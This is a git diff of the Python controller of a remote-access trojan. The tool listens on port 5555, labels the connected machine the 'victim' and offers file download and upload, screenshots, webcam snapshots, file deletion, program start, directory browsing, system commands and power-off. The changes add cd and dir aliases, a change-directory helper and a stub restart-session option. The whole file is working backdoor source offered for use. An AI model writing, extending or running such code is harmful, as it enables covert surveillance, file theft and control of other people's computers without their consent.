@@ -82,8 +82,15 @@ def upload():
         print("Entered file does not exist!")
 
 
+def change_directory():
+    current_directory = connection.recv(1024).decode()
+    transition = input(f"Enter directory: {current_directory}: ")
+    connection.send(transition.encode())
+    print(connection.recv(1024).decode())
+
+
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((get_local_ip(), 6969))
+server.bind((get_local_ip(), 5555))
 server.listen(1)
 
 print(f"Server listen on address {get_local_ip()} on port '5555'")
@@ -94,7 +101,7 @@ operating_system = connection.recv(1024).decode()
 print(f"Operating system for victim is : {Fore.RED}{operating_system}{Fore.RESET}")
 
 # лист выводящий опции работы с жертвой
-list_option = ("break", "work_with_file", "system_command")
+list_option = ("break", "work_with_file", "system_command", "restart_session")
 option = ("Download", "Upload", "break", "screenshot", "snapshot", "remove", "start", "ls", "change_directory")
 system_option = ("break", "power_off")
 
@@ -158,25 +165,25 @@ if "Windows" in operating_system:
                     result = connection.recv(1024).decode()
                     print(f"Result for operation 'start' is : {Fore.BLUE}{result}{Fore.RESET}")
 
-                elif operation == "break" or operation == "1" or operation == "o":
+                elif operation == "break" or operation == "1" or operation == "b":
                     connection.send(operation.encode())
                     print(f"work - {Fore.YELLOW}work_with_file{Fore.RESET} - was finished!")
                     break
 
-                elif operation == "ls":
-                    connection.send(operation.encode())
-                    size_of_result = int(connection.recv(1024))
+                elif operation == "ls" or operation == "dir":
+                    connection.send("ls".encode())
+                    size_of_result = int(connection.recv(1024).decode())
                     print(connection.recv(size_of_result).decode())
 
-                elif operation == "change_directory":
-                    connection.send(operation.encode())
-                    current_directory = connection.recv(1024).decode()
-                    transition = input(f"Enter directory: {current_directory}: ")
-                    connection.send(transition.encode())
-                    print()
+                elif operation == "change_directory" or operation == "cd":
+                    connection.send("change_directory".encode())
+                    size_of_result = int(connection.recv(1024).decode())
+                    print(connection.recv(size_of_result).decode())
+                    change_directory()
 
                 else:
-                    print(f"{Fore.RED}Such an operation as - {operation} - does not exist!!!{Fore.RESET}")
+                    connection.send("incorrect operation".encode())
+                    print(f"{Fore.RED}Such an operation as -{operation}- does not exist!!!{Fore.RESET}")
 
         elif chosen_operation == "system_command" or chosen_operation == "3" or chosen_operation == "s":
             current_directory = connection.recv(1024).decode()
@@ -195,12 +202,15 @@ if "Windows" in operating_system:
                 else:
                     print(f"{Fore.RED}Unknown command{Fore.RESET}")
 
-        elif chosen_operation == "break":
+        elif chosen_operation == "break" or chosen_operation == "1":
             connection.send("break".encode())
             time.sleep(0.2)
             connection.close()
             server.close()
             break
+
+        elif chosen_operation == "restart_session":
+            print("you forgot add this function!!!")
 
         else:
             print(f"{Fore.RED}Such an operation as --{chosen_operation}-- does not exist!!!{Fore.RESET}")
